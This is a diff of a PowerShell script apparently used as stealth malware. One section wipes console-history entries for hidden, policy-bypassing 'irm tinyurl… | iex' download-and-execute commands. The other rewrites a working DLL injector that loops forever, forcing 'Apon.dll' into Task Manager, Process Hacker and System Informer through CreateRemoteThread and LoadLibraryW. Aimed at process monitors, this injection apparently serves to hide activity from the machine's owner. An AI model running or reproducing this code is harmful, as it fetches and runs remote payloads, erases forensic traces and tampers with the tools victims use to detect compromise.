@@ -6,7 +6,7 @@ $historyFile = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost
 
 $blockedCommands = @(
     'powershell -windowstyle hidden -ep bypass -c "irm https://tinyurl.com/CursedCoreHidden | iex"',
-    'powershell -windowstyle hidden -ep bypass -c "irm https://tinyurl.com/cursedcorehack | iex"'
+    'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File "C:\Users\adris\Desktop\Powershell ki Chudai\history delete.ps1"'
 )
 
 if (Test-Path $historyFile) {
@@ -33,21 +33,28 @@ if (Test-Path $historyFile) {
 # 2) DLL Injector Loop
 # -------------------------------
 
-Add-Type -TypeDefinition @"
+$dllFolder = "C:\Windows\System32"
+$dll1 = "Apon.dll"
+$dll1Path = Join-Path $dllFolder $dll1
+$targetProcesses = @("Taskmgr", "ProcessHacker", "SystemInformer")
+$injectedPIDs = @{}
+
+$injectorCode = @"
 using System;
+using System.Text;
+using System.Diagnostics;
 using System.Runtime.InteropServices;
 
-public class Win32 {
+public class Injector
+{
     [DllImport("kernel32.dll")]
-    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
 
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
-        uint dwSize, uint flAllocationType, uint flProtect);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
 
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
-        byte[] lpBuffer, int nSize, out int lpNumberOfBytesWritten);
+    [DllImport("kernel32.dll")]
+    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, uint size, out UIntPtr written);
 
     [DllImport("kernel32.dll")]
     public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
@@ -56,81 +63,83 @@ public class Win32 {
     public static extern IntPtr GetModuleHandle(string lpModuleName);
 
     [DllImport("kernel32.dll")]
-    public static extern IntPtr CreateRemoteThread(IntPtr hProcess,
-        IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
-        IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes,
+        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
 
-    public const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
-    public const uint MEM_COMMIT = 0x1000;
-    public const uint MEM_RESERVE = 0x2000;
+    [DllImport("kernel32.dll")]
+    public static extern bool CloseHandle(IntPtr hObject);
+
+    public const int PROCESS_CREATE_THREAD = 0x0002;
+    public const int PROCESS_QUERY_INFORMATION = 0x0400;
+    public const int PROCESS_VM_OPERATION = 0x0008;
+    public const int PROCESS_VM_WRITE = 0x0020;
+    public const int PROCESS_VM_READ = 0x0010;
+
+    public const uint MEM_COMMIT = 0x00001000;
+    public const uint MEM_RESERVE = 0x00002000;
     public const uint PAGE_READWRITE = 0x04;
+
+    public static bool Inject(int pid, string dllPath)
+    {
+        IntPtr hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, pid);
+        if (hProcess == IntPtr.Zero)
+            return false;
+
+        IntPtr allocMemAddress = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))),
+            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (allocMemAddress == IntPtr.Zero)
+            return false;
+
+        byte[] bytes = Encoding.Unicode.GetBytes(dllPath);
+        UIntPtr bytesWritten;
+        bool result = WriteProcessMemory(hProcess, allocMemAddress, bytes, (uint)bytes.Length, out bytesWritten);
+        if (!result || bytesWritten.ToUInt32() != bytes.Length)
+            return false;
+
+        IntPtr kernel32Handle = GetModuleHandle("kernel32.dll");
+        IntPtr loadLibraryAddr = GetProcAddress(kernel32Handle, "LoadLibraryW");
+        if (loadLibraryAddr == IntPtr.Zero)
+            return false;
+
+        IntPtr remoteThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);
+        if (remoteThread == IntPtr.Zero)
+            return false;
+
+        CloseHandle(hProcess);
+        return true;
+    }
 }
-"@ -Language CSharpVersion3
+"@
 
-# Target processes to inject into
-$targetProcesses = @(
-    "ProcessHacker",
-    "SystemInformer",
-    "procexp",
-    "taskmgr"
-)
+Add-Type -TypeDefinition $injectorCode -Language CSharp
 
-
-$dllPath = "C:\Windows\System32\APon.dll"
-$alreadyInjected = @{}
+Write-Output "Monitoring processes: $($targetProcesses -join ', ')..."
 
 while ($true) {
-    foreach ($name in $targetProcesses) {
-        $procList = Get-Process -Name $name -ErrorAction SilentlyContinue
-
-        foreach ($proc in $procList) {
-            if ($alreadyInjected.ContainsKey($proc.Id)) {
-                continue
-            }
-
-            Write-Host "[+] Found $name (PID $($proc.Id)) - Injecting..."
-
-            $hProcess = [Win32]::OpenProcess([Win32]::PROCESS_ALL_ACCESS, $false, $proc.Id)
-            if ($hProcess -eq [IntPtr]::Zero) {
-                Write-Host "[-] Cannot open process $name PID $($proc.Id)"
-                continue
-            }
-
-            $dllBytes = [System.Text.Encoding]::ASCII.GetBytes($dllPath + [char]0)
-            $alloc = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $dllBytes.Length,
-                [Win32]::MEM_COMMIT -bor [Win32]::MEM_RESERVE, [Win32]::PAGE_READWRITE)
-
-            if ($alloc -eq [IntPtr]::Zero) {
-                Write-Host "[-] Memory allocation failed."
-                continue
-            }
-
-            $written = 0
-            [Win32]::WriteProcessMemory($hProcess, $alloc, $dllBytes, $dllBytes.Length, [ref]$written) | Out-Null
-
-            $loadLib = [Win32]::GetProcAddress([Win32]::GetModuleHandle("kernel32.dll"), "LoadLibraryA")
-            if ($loadLib -eq [IntPtr]::Zero) {
-                Write-Host "[-] Could not find LoadLibraryA."
-                continue
-            }
-
-            $thread = [Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLib, $alloc, 0, [IntPtr]::Zero)
-            if ($thread -ne [IntPtr]::Zero) {
-                Write-Host "[+] Injected into PID $($proc.Id)"
-                $alreadyInjected[$proc.Id] = $true
-            } else {
-                Write-Host "[-] Thread creation failed."
+    foreach ($processName in $targetProcesses) {
+        $procs = Get-Process -Name $processName -ErrorAction SilentlyContinue
+        foreach ($proc in $procs) {
+            if (-not $injectedPIDs.ContainsKey($proc.Id)) {
+                Write-Output "Injecting into $processName"
+                $success = [Injector]::Inject($proc.Id, $dll1Path)
+                if ($success) {
+                    Write-Host "[+] Done" -ForegroundColor Green
+                    $injectedPIDs[$proc.Id] = $true
+                } else {
+                    Write-Warning "Failed to inject" -ForegroundColor Red
+                }
             }
         }
     }
 
-    # Cleanup dead PIDs from injected list
-    $runningPIDs = Get-Process | Select-Object -ExpandProperty Id
-    $alreadyInjected.Keys | ForEach-Object {
-        if ($_ -notin $runningPIDs) {
-            $alreadyInjected.Remove($_)
+        # Remove exited processes from tracking
+        foreach ($procId in @($injectedPIDs.Keys)) {
+            if (-not (Get-Process -Id $procId -ErrorAction SilentlyContinue)) {
+                $injectedPIDs.Remove($procId)
+                Write-Output "Process with PID $procId has exited. Monitoring again."
+            }
         }
-    }
 
-    Start-Sleep -Seconds 2
+
+    Start-Sleep -Seconds 1
 }
